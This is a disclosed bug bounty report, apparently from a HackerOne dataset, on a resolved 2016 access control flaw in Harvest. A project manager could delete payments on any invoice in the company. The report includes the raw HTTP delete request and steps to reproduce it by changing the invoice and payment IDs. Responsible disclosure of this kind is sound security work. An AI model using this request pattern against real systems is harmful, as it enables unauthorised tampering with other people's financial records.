---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '159393'
original_report_id: '159393'
title: PM can delete payment of any invoice in company (Access control Issue)
weakness: Improper Authentication - Generic
team_handle: harvest
created_at: '2016-08-15T02:06:01.674Z'
disclosed_at: '2016-09-29T23:03:39.077Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- improper-authentication-generic
---

# PM can delete payment of any invoice in company (Access control Issue)

## Metadata

- HackerOne Report ID: 159393
- Weakness: Improper Authentication - Generic
- Program: harvest
- Disclosed At: 2016-09-29T23:03:39.077Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

Description :  Project manager(Full Access) have Access to only assigned projects and he will have access to limited Invoices. But Project manager can Delete Payment of Any invoices in the company. The HTTP request Doesn't check whether Project manager have access to the project or not. 

HTTP request : 

POST /invoices/[Invoice_ID]/payments/[Payment_ID]HTTP/1.1
Host: vijaygangani.harvestapp.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://vijaygangani.harvestapp.com/invoices/10392603
Cookie: [Cookie_values]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 128

_method=delete&authenticity_token=[Oauth_token]

Steps to reproduce : 
In the above mentioned Request change the Invoice_ID and payment_ID Accordingly and send it to server by the Project manager who doesn't have access to this Invoice . You will see that the Payment will be deleted for that particular Invoice .


Let me know if you need detailed Steps or Video poc for this issue.


Best Regards !
Vijay Kumar

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
